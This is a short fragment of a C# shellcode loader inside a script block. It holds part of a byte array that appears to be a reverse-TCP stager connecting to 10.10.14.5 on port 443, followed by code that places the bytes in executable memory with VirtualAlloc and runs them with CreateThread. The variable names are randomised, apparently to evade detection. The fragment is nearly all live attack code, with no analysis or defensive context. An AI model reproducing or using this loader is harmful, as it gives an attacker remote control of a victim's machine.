...
0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x0a,0x0e,0x05,0x68,0x02,0x00,0x01,0xbb,0x89,
...
0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr aLYw = VirtualAlloc(IntPtr.Zero,(UIntPtr)yXW5.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(yXW5,0,aLYw,yXW5.Length);
        IntPtr eXGZb = IntPtr.Zero;
        IntPtr eEkAhAcSjv = CreateThread(IntPtr.Zero,UIntPtr.Zero,aLYw,IntPtr.Zero,0,ref eXGZb);
    }
</script>
